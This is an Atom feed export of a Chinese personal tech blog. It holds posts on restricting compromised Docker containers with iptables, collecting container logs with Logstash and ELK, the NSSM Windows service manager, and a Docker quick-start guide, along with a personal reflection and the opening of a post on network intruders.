&lt;h2 id=&quot;0x02-另类视角一：孤岛限制&quot;&gt;&lt;a href=&quot;#0x02-另类视角一：孤岛限制&quot; class=&quot;headerlink&quot; title=&quot;0x02 另类视角一：孤岛限制&quot;&gt;&lt;/a&gt;0x02 另类视角一：孤岛限制&lt;/h2&gt;&lt;p&gt;我们这里谈到的安全，将从另一个视角来解读，假设我们默认部署好的容器应用存在某种漏洞而被利用，最坏的情况是攻击者完全拿下了容器并且取得了root权限。可以预想到的是，在默认的配置下，拥有root权限的Docker就如同真正的跳板机一样，容器如同使用宿主机作为路由器的主机，不仅能够扫描到宿主机的端口情况，还可以扫描到宿主机所在网段的拓扑。&lt;/p&gt;
&lt;p&gt;最初是想在宿主机上做端口转发策略的限制，进而限制容器访问到更大范围的局域网。本以为在宿主机上的端口转发并不会影响宿主机的网络访问功能。使用如下指令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sysctl net.ipv4.ip_forward
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在宿主机上运行上面的指令可以查看当前的转发策略是否开启，当键值为1时表示开启，此时的容器网络访问是畅行无阻的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo sysctl -w net.ipv4.ip_forward=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用上面的命令可以临时将这个参数的键值改为0，此时我们发现容器只能访问到同一网段的其它容器而无法访问到宿主机所在的局域网中，与此同时，我们只要保证作为路由器的宿主机上没有运行开启端口的应用，就应该是安全的。可是随后注意到一个问题，关闭容器对外的端口转发后，外界对于容器的访问也一起被禁止了。&lt;/p&gt;
&lt;p&gt;这样的话，只能乖乖的在iptables上做文章了。因为不是介绍iptables的文章，就不多对这个Linux下自带的防火墙做过多的介绍。我的想法是使用宿主机的iptables禁止相应的应用容器访问外网（包括宿主机所在的局域网），这样既能实现容器限制，又不会影响外界访问容器。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo iptables -I FORWARD -i docker0 -o ens33 -j DROP
sudo iptables -I FORWARD -i docker0 -o ens33 -m state --state RELATED,ESTABLISHED  -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该命令可以从宿主机的层面限制容器对外的访问，这样可以从一定程度上解决通过容器做跳板的问题。这样的场景实际上就像是将容器设置成只有一条单向入口的孤岛，只允许外界对容器进行访问，而不允许使用容器在做进一步的其它网络访问。&lt;/p&gt;
&lt;h2 id=&quot;0x03-另类视角二：文件监控&quot;&gt;&lt;a href=&quot;#0x03-另类视角二：文件监控&quot; class=&quot;headerlink&quot; title=&quot;0x03 另类视角二：文件监控&quot;&gt;&lt;/a&gt;0x03 另类视角二：文件监控&lt;/h2&gt;&lt;p&gt;除了上述限制的方法外，我们还可以对于容器中的重点文件夹或文件做监控，一旦检测到相应的文件发生变化，可以立即重新生成新的镜像，以应对攻击。&lt;/p&gt;
&lt;p&gt;这里的架构思路如下，作为监控程序，它不应该位于目标容器内，所以我们考虑使用我在上一个谈论Docker日志的笔记里提到的挂载的方式，将容器内部重要的文件夹挂载进监控容器内，在监控容器内运行程序监控相应文件的增、删、改等操作，一旦发现不被允许的操作执行，就关闭容器或者重新构建容器。具体文件监控容器方面的学习有机会再在后面贴出。&lt;/p&gt;
&lt;h2 id=&quot;0x04-综述&quot;&gt;&lt;a href=&quot;#0x04-综述&quot; class=&quot;headerlink&quot; title=&quot;0x04 综述&quot;&gt;&lt;/a&gt;0x04 综述&lt;/h2&gt;&lt;p&gt;Docker一旦部署到真实环境中，我们就要对它的安全性做全面的衡量，不过通过上述分析，在排除可能存在0Day的情况下，只要配置得当，Docker的安全性还是有保障的。&lt;/p&gt;
&lt;p&gt;由于容器的便携性、易部署性、隔离性，我们可以很方便的在部署容器服务的同时，连带部署一系列的监控、处理容器对于服务容器做维护。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Docker怎么做才能在被别人拿到SHELL后将危害做到最小？&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://phantom0301.coding.me/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://phantom0301.coding.me/tags/Docker/"/>
    
      <category term="信息安全" scheme="http://phantom0301.coding.me/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="入门" scheme="http://phantom0301.coding.me/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>再探Docker-日志收集</title>
    <link href="http://phantom0301.coding.me/2016/07/20/Docker2/"/>
    <id>http://phantom0301.coding.me/2016/07/20/Docker2/</id>
    <published>2016-07-20T08:11:59.000Z</published>
    <updated>2016-08-04T08:01:46.972Z</updated>
    
    <content type="html">&lt;p&gt;一次Docker项目需求构架的尝试    &lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-方法选择&quot;&gt;&lt;a href=&quot;#0x01-方法选择&quot; class=&quot;headerlink&quot; title=&quot;0x01 方法选择&quot;&gt;&lt;/a&gt;0x01 方法选择&lt;/h2&gt;&lt;p&gt;当我们的Docker部署完成后，为了能够掌握Docker的状态，除了使用logs、event、diff等实时运维命令查看外，我们还存在需要对Docker产生的日志进行收集整理分析的必要。&lt;/p&gt;
&lt;p&gt;网上能找到的日志收集系统有很多，例如Flume、Fluentd、Logstash等等。经过一段时间的摸索搭建，个人最容易搭建成功的是Logstash，而且整个ELK体系也提供一套完整的日志收集、存储、查找、可视化流程，可以省去很多编写中间件的精力。&lt;/p&gt;
&lt;h2 id=&quot;0x02-调试&quot;&gt;&lt;a href=&quot;#0x02-调试&quot; class=&quot;headerlink&quot; title=&quot;0x02 调试&quot;&gt;&lt;/a&gt;0x02 调试&lt;/h2&gt;&lt;p&gt;所以最终我的整体架构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker1\
        \
docker2——————&amp;gt;docker-logstash————&amp;gt;任意机器（可以不是宿主机）
        /
docker3/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ELK一整套工具可以很方便的从Elastic的官网上下到，在这里就不在赘述。在任意一台主机上安装Elasticsearch和Kibana，在宿主机上安装不同的Docker以及一个Logstash的Docker。这里我使用我在上一篇博客中编译好的Wordpress的Docker。不同的是我需要将WP中记录日志的文件夹挂载到logstash-docker上。命令如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -d -v /var/log/nginx/ --name wordpress -p 0.0.0.0:80:80 long/wordpress
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单解释一下这条命令，我们运行了之前编译好的Wordpress，将其中的Nginx下的日志挂载出来。&lt;/p&gt;
&lt;p&gt;接下来，我们再从官网仓库中pull下Docker版的Logstash，使用如下命令开启：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -it --rm --volumes-from wordpress -v &amp;quot;$PWD&amp;quot;:/home  logstash logstash -f /home/test.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有几个坑要事先声明一下，一个是这里我使用了Logstash的配置文件，而这个配置文件我是从宿主机挂载到容器的home文件夹下，另一个点就是Logstash容器从Wordpress中接手之前挂载的文件夹，从里面实时增量读取日志，但是两个容器的权限不对应，所以要注意在Wordpress容器对相应的文件夹做权限变更。&lt;/p&gt;
&lt;p&gt;Logstash的配置文件我写法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;input {
    file {
        path =&amp;gt; &amp;quot;xxxx&amp;quot;
        start_position =&amp;gt; beginning
         }
      }
filter {

       }

output {
    stdout { }
       }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从日志中读取信息，打印在标准输出中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker21.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这一步调试成功后，我们接着调试Elastic的部分，Elastic+Kibana我是运行在一台Windows的主机上的，运行前调整Elastic的配置文件中的，使得宿主机可以访问到它，当然这里的访问是没有任何认证的，但是作为测试，我们先不讨论安全问题。&lt;/p&gt;
&lt;p&gt;通过windows主机访问宿主机上的Wordpress-docker，然后访问&lt;/p&gt;
&lt;p&gt;此时，宿主机中容器的日志已经显示在了Windows的主机中。&lt;/p&gt;
&lt;h2 id=&quot;0x03-总结&quot;&gt;&lt;a href=&quot;#0x03-总结&quot; class=&quot;headerlink&quot; title=&quot;0x03 总结&quot;&gt;&lt;/a&gt;0x03 总结&lt;/h2&gt;&lt;p&gt;利用这种方式，我们实现了容器日志传输到任意主机上存储的目的，而日志传输则是通过在多个容器之间挂载目录实现。这样做，可以很好的实现应用、日志（或数据）之间的解耦合，将重要日志存储在更安全的实体主机上，便于实现中心对应分布的日志分析。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;一次Docker项目需求构架的尝试    &lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://phantom0301.coding.me/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://phantom0301.coding.me/tags/Docker/"/>
    
      <category term="入门" scheme="http://phantom0301.coding.me/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>效率利器-NSSM</title>
    <link href="http://phantom0301.coding.me/2016/07/19/NSSM/"/>
    <id>http://phantom0301.coding.me/2016/07/19/NSSM/</id>
    <published>2016-07-19T13:20:30.000Z</published>
    <updated>2016-08-04T07:59:37.035Z</updated>
    
    <content type="html">&lt;p&gt;NSSM(the Non-Sucking Service Manager),作为英语战五渣，为了弄清它的中文译名也是查了很多资料，关键在于Non-Sucking这个词应该如何翻译，姑且翻译成“不糟糕的服务管理器”这样页游装备名般的中文。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;言归正传，NSSM是一款开源的Windows下”好用的服务管理工具”，根据它自己的介绍，之所以叫“Non-Sucking”,是因为其他类似的工具都不能很好的处理正在运行中的应用失败的情况。感觉上它有点像Ubuntu下的supervisor。&lt;/p&gt;
&lt;p&gt;而服务管理工具的作用其实就是将运行的应用封装成系统服务，这样针对于一些bat的脚本程序可以快速执行操纵命令并监控程序是否存活,就像下面的样子，我将ELK应用作为服务来启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/N1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下载方面可以访问这个地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nssm.cc/download&quot; title=&quot;https://nssm.cc/download&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://nssm.cc/download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用方面十分简单，将下载好的文件进行解压，再将nssm.exe复制到需要启动的应用所在目录中，在当前目录执行cmd命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nssm install &amp;lt;servicename&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时就会弹出安装界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://nssm.cc/images/install_application.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在Application界面的Path配置需要启动的exe或者bat等程序的路径，Detail界面命名服务名和描述信息，Dependencies界面配置依赖的环境，就是已有的服务名。&lt;/p&gt;
&lt;p&gt;将这些基本信息配置好后，点击Install service安装完毕。&lt;/p&gt;
&lt;p&gt;这个时候，可以在控制面板-管理-服务中看到已经安装成功的服务，通过这个界面可以打开服务，这时，你所指定的程序应用就以服务的名义运行起来了。&lt;/p&gt;
&lt;p&gt;先在这里安利这款工具以及它的基本运行命令，详细的官方文档有时间会在后面翻译出来吧~~&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;NSSM(the Non-Sucking Service Manager),作为英语战五渣，为了弄清它的中文译名也是查了很多资料，关键在于Non-Sucking这个词应该如何翻译，姑且翻译成“不糟糕的服务管理器”这样页游装备名般的中文。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://phantom0301.coding.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Docker快速入门</title>
    <link href="http://phantom0301.coding.me/2016/07/16/Docker1/"/>
    <id>http://phantom0301.coding.me/2016/07/16/Docker1/</id>
    <published>2016-07-16T01:14:01.000Z</published>
    <updated>2016-08-04T07:55:36.795Z</updated>
    
    <content type="html">&lt;p&gt;套用介绍Docker的话，Docker是一个开源的引擎，可以创建一个轻量级的虚拟系统。由于它可以更加轻量级的实现虚拟机的作用，而且它自带很多很方便的监控运行系统状态的特性，所以受到大家的青睐。&lt;/p&gt;
&lt;p&gt;这篇博客旨在快速部署Docker，并不是对Docker进行深入研究，所以只会说说我在实际用Docker的过程中使用频次较高的实际指令，并不会详细介绍Docker基于Linux的底层实现原理和理论的东西，如果有错误请留言指正。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-基本部署&quot;&gt;&lt;a href=&quot;#0x01-基本部署&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本部署&quot;&gt;&lt;/a&gt;0x01 基本部署&lt;/h2&gt;&lt;p&gt;这里我使用Ubuntu16.04进行测试。先说说Docker的安装，最简单的方法的直接使用Ubuntu的apt-get安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get install docker
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而我为了能够安装最新版的Docker，使用下面更加复杂的方法：&lt;/p&gt;
&lt;p&gt;1.升级source列表，安装相应的ca证书&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get install apt-transport-https ca-certificates
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.增加密钥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.添加源列表文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vi /etc/apt/sources.list.d/docker.list
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.按照系统版本增加entry&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo deb https://apt.dockerproject.org/repo ubuntu-xenial main
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.安装docker并测试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get install docker-engine
sudo service docker start
sudo docker run hello-world
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个时候docker程序会先检查本地仓库是否有镜像，如果没有，就会从官方的仓库中拉取相应的镜像并运行它。而这个hello-world的程序还会打印出官方的一些帮助信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x02-常用命令&quot;&gt;&lt;a href=&quot;#0x02-常用命令&quot; class=&quot;headerlink&quot; title=&quot;0x02 常用命令&quot;&gt;&lt;/a&gt;0x02 常用命令&lt;/h2&gt;&lt;p&gt;接着上一节拉取到的镜像，我们就用这个镜像说明Docker会经常用到的一些指令。&lt;/p&gt;
&lt;p&gt;0.快速的搜寻镜像&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker search 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种方法可以快速的从官方仓库查找可用的镜像，相比起直接访问官网查询，这种方法不用太多的等待，不足之处在于，作为初心者，这种方式几乎看不到镜像的详细使用说明，对新手的使用并不够友好，而在官网上可以看到作者的详细使用说明和Dockerfile文件，更适合我们入门学习。&lt;/p&gt;
&lt;p&gt;1.安静的拉取镜像&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker pull 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令只会从官方仓库下载镜像到本地，并不会执行生成容器。 &lt;/p&gt;
&lt;p&gt;2.方便的掌握镜像&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker images
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看本地仓库中的可用镜像&lt;/p&gt;
&lt;p&gt;3.常用的运行方式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -it 镜像名或id /bin/bash
docker run -d 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上两种是学习过程中经常能够看到的命令，前者适合对于生成的容器进行调试，而且即使没有前台进程（后面会说这个的关系），它也可以运行起来；后者多作为真正部署时使用。&lt;/p&gt;
&lt;p&gt;之所以会这样，当然是因为run后面不同的参数值了，i参数是为了保持stdin打开，t参数是为了维持一个为终端，而d参数测试在后台运行容器。&lt;/p&gt;
&lt;p&gt;当容器运行在后台时，它就有点像我们通常在Windows下执行可执行程序的逻辑，当没有循环或者其他逻辑维持它的前台进程时，容器就会自动结束。所以当使用d参数时，就需要有一个前台进程来保持容器的运行。&lt;/p&gt;
&lt;p&gt;run指令下还有一些常用的参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-a参数，负责进行连接附加，可以连接标准输入输出等
-e参数，设置环境变量，例如一些数据库镜像的生成时的参数
--name，重命名容器，方便进行管理，避免了你输入那些随机生成的科学家名或者ID
-p参数，将容器内的端口映射到宿主机相应端口
-v参数，挂载容器内的内容
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其他参数可以直接查阅手册，这里只列出了我常用到的参数。&lt;/p&gt;
&lt;p&gt;示例如下：&lt;/p&gt;
&lt;p&gt;我们运行一个由我自己编译的wordpress镜像，内置数据库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们先用images查看可用的镜像&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在使用下面这个指令来启动镜像，生成容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker -d --name wordpress -p 0.0.0.0：80：80 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成的同时，容器被赋予了一个唯一的ID&lt;/p&gt;
&lt;p&gt;4.常用的维护命令&lt;/p&gt;
&lt;p&gt;还是如上图&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker ps 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以查看正在运行的容器和基本信息，而-l参数则显示上一次运行过的容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker inspect 容器名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以查看容器的详细信息，这个指令的输出较多，就不截图了。不过这个指令结果里有几个重要参数值的我们注意：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;容器的宿主机存储路径，包括容器主机名、配置信息、日志等&lt;/li&gt;
&lt;li&gt;容器映射出的端口信息&lt;/li&gt;
&lt;li&gt;网络服务的配置信息，包括容器ip、DNS等&lt;/li&gt;
&lt;li&gt;运行环境的配置信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;……&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这些信息可以帮助我们更好的去认识镜像、容器、宿主机之间的关系&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec -it 容器名 /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这条指令可以方便我们去访问后台运行状态的容器内部，进行修改添加应用，当然，也可以在一开始就给容器开一个ssh进行管理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker events/logs/info
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这几条指令都是将容器当前运行的一些事件、日志信息输出到宿主机界面上，方便我们进行容器部署应用的观察和管理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker commit 容器名 镜像名：标签
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交一个你修改满意的容器到本地仓库生成相应的镜像&lt;/p&gt;
&lt;p&gt;5.常用的删除启动命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker start/stop/restart 容器名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个不用多解释了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker rm 容器名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;永久删除当前容器，但是前提是先stop了这个容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker rmi 镜像名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;永久删除本地仓库中的镜像&lt;/p&gt;
&lt;p&gt;有了这几条命令，简单运行一个Docker就基本逻辑可以走顺了，当然，完整的命令请参照官方手册。&lt;/p&gt;
&lt;p&gt;还有几个关键命令会在下一节适合它们的地方登场。&lt;/p&gt;
&lt;h2 id=&quot;0x03-DIY&quot;&gt;&lt;a href=&quot;#0x03-DIY&quot; class=&quot;headerlink&quot; title=&quot;0x03 DIY&quot;&gt;&lt;/a&gt;0x03 DIY&lt;/h2&gt;&lt;p&gt;官方仓库中经过认证和未认证的项目有上千例（未具体求证），基本满足我们的应用部署需要，但是，有时候我们的有一些特殊需求时，可能就需要我们自己去编译一个镜像。&lt;/p&gt;
&lt;p&gt;当然，在介绍这部分之前，不得不提一个Dockeric（不保证有这么个词）的观点，Docker实现的容器应该是模块化的，所以每一个单独的容器最好只运行一个单独的进程，复杂的逻辑关系应该通过容器间的连接（–link）实现。向我在之前作为例子实现的wordpress其实就是一个反例，因为我在一个容器中同时放入了wordpress进程和mysql进程。所以，在DIY编译镜像时，尽量不要想使用vmware那样放太多的东西进去，小心鸡蛋砸在一个Container里~~。&lt;/p&gt;
&lt;p&gt;先入门基本指令，我以我的wordpress为例：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FROM ubuntu:14.04&lt;/p&gt;
&lt;p&gt;MAINTAINER xxxx &lt;a href=&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#120;&amp;#x78;&amp;#120;&amp;#x78;&amp;#x40;&amp;#120;&amp;#x78;&amp;#120;&amp;#120;&quot;&gt;&amp;#120;&amp;#x78;&amp;#120;&amp;#x78;&amp;#x40;&amp;#120;&amp;#x78;&amp;#120;&amp;#120;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ENV DEBIAN_FRONTEND noninteractive&lt;/p&gt;
&lt;p&gt;RUN apt-get update&lt;/p&gt;
&lt;p&gt;RUN apt-get -y upgrade&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上手先W再E，FROM决定整个镜像的根基，你是打算用Ubuntu:14.04，Ubuntu:latset，CentOS还是什么其他的；MAINTAINER填写创建者信息；RUN是运行安装指令的基础；ENV设置环境变量&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RUN apt-get -y install mysql-server mysql-client nginx php5-fpm php5-mysql php-apc pwgen python-setuptools curl git unzip&lt;/p&gt;
&lt;p&gt;RUN sed -i -e”s/^bind-address\s&lt;em&gt;=\s&lt;/em&gt;127.0.0.1/bind-address = 0.0.0.0/“ /etc/mysql/my.cnf&lt;br&gt;……&lt;/p&gt;
&lt;p&gt;ADD ./nginx-site.conf /etc/nginx/sites-available/default&lt;/p&gt;
&lt;p&gt;EXPOSE 3306&lt;/p&gt;
&lt;p&gt;EXPOSE 80&lt;/p&gt;
&lt;p&gt;VOLUME [“/var/lib/mysql”, “/usr/share/nginx/www”]&lt;/p&gt;
&lt;p&gt;CMD [“/bin/bash”, “/start.sh”]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接着Q后面接R，ADD可以拷贝编译文件夹下的文件到镜像生成后的容器的相应文件夹下，EXPOSE则设置容器内部开启的端口，VOLUME负责挂载容器的文件，CMD是容器启动时执行的命令。而有多条CMD命令时，只执行最后的一行的CMD命令。&lt;/p&gt;
&lt;p&gt;当然这个文件只是说明，并不完整，完整的Dockerfile官网上有很多，我就不把我写的蹩脚file放到这里了。&lt;/p&gt;
&lt;p&gt;写好写指令后，保存为Dockerfile文件名，存在一个文件夹下，把相应的外部文件也都移到一起。&lt;/p&gt;
&lt;p&gt;在当前目录下执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker build -t 自己起的镜像名 .（这里还有一点，别看掉了）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序就会按照你指定的安装流程进行相应的安装了。&lt;/p&gt;
&lt;h2 id=&quot;0x04-结语&quot;&gt;&lt;a href=&quot;#0x04-结语&quot; class=&quot;headerlink&quot; title=&quot;0x04 结语&quot;&gt;&lt;/a&gt;0x04 结语&lt;/h2&gt;&lt;p&gt;还是要说一下，这一篇是基于快速部署而写下的，内容肯定很浅薄，后面随着我对Docker学习的深入，应该还会有更进一步的经验总结和实际应用。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;套用介绍Docker的话，Docker是一个开源的引擎，可以创建一个轻量级的虚拟系统。由于它可以更加轻量级的实现虚拟机的作用，而且它自带很多很方便的监控运行系统状态的特性，所以受到大家的青睐。&lt;/p&gt;
&lt;p&gt;这篇博客旨在快速部署Docker，并不是对Docker进行深入研究，所以只会说说我在实际用Docker的过程中使用频次较高的实际指令，并不会详细介绍Docker基于Linux的底层实现原理和理论的东西，如果有错误请留言指正。&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://phantom0301.coding.me/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://phantom0301.coding.me/tags/Docker/"/>
    
      <category term="入门" scheme="http://phantom0301.coding.me/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>碎碎念</title>
    <link href="http://phantom0301.coding.me/2016/07/04/whisper/"/>
    <id>http://phantom0301.coding.me/2016/07/04/whisper/</id>
    <published>2016-07-04T10:49:17.000Z</published>
    <updated>2016-08-04T07:59:18.525Z</updated>
    
    <content type="html">&lt;p&gt;离别的氛围仿佛嵌进了空气一般，凝结在每一次的呼吸中。作为留守者，送别一个个远去的身影也仿佛成为了一种义务。有时明知道结果是离别，便不愿投入太多在一件事，一个人上，可是在还未分别的时光消磨下，也不知不觉的将他们在心中的地位不断提升，等到真正的离别到来时，才发现，哦，原来再向他们说分别已是如此的困难了。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;我们的生命就这样被分割成了一段段的相遇和离别，无论如何好像也摆脱不掉这样的轮回。在一整段的时光里看起来是那样的光鲜亮丽，可若是逢着连接整段时光的那些间隙，就难免让人有些失落和孤寂。毕竟，和一群人一起拥有了那么多的回忆，可是转瞬，就只剩下了你自己。&lt;/p&gt;
&lt;p&gt;终究一切的碎碎念和不好的情绪都要被自己消化掉，也渐渐强迫着用麻木的心态去对待这些离别，有时这被称为成长或是强大。当然，运动和其他的什么爱好可以作为占据内心的那些人或事离开时暂时的寄托，于是制订一项项学习，锻炼的计划也是远离不安孤寂不错的方法。&lt;/p&gt;
&lt;p&gt;其实做出某些选择时，前方未知的道路便已经渐渐露出了它延伸的方向。而我们能够做的，是决定以什么样的姿态去走完它。我总是希望自己最终不会败给生活中的苟且，希望即便有可能充满艰难，但依然在不易中有自己去选择的权利和自由。离开了一群人，我希望再相遇一些能让我不舍得人。结束了一段还尚且满意的生涯，我希望能够依然在接下去的时光中昂首前进。&lt;/p&gt;
&lt;p&gt;山已成隍，花已成尘，就在这变迁中不忘初心，追逐梦想。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;离别的氛围仿佛嵌进了空气一般，凝结在每一次的呼吸中。作为留守者，送别一个个远去的身影也仿佛成为了一种义务。有时明知道结果是离别，便不愿投入太多在一件事，一个人上，可是在还未分别的时光消磨下，也不知不觉的将他们在心中的地位不断提升，等到真正的离别到来时，才发现，哦，原来再向他们说分别已是如此的困难了。&lt;/p&gt;
    
    </summary>
    
      <category term="感悟" scheme="http://phantom0301.coding.me/categories/%E6%84%9F%E6%82%9F/"/>
    
    
      <category term="感悟" scheme="http://phantom0301.coding.me/tags/%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>闲谈-隐匿于网络中的入侵者</title>
    <link href="http://phantom0301.coding.me/2016/05/18/invader/"/>
    <id>http://phantom0301.coding.me/2016/05/18/invader/</id>
    <published>2016-05-18T12:05:53.000Z</published>
    <updated>2016-08-04T07:59:30.350Z</updated>
    
    <content type="html">&lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;最近一段时间都在赶毕业设计了，觉得这期间被挖出来的那些影响比较大的漏洞都没有细致的去了解。不过论文之余，晚上睡前都在看Gregory Fell和Mike Barlow的《Who are the bad guys and what do they want？》，其中的第一部分就是书名的前半段。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;查过一些作者们的资料，似乎两位都不是专门研究信息安全的学者，所以书中大量的内容其实应该是来自作者们对于相关专家话语的记录，不过书中提到的很多观点都很有意思。&lt;/p&gt;
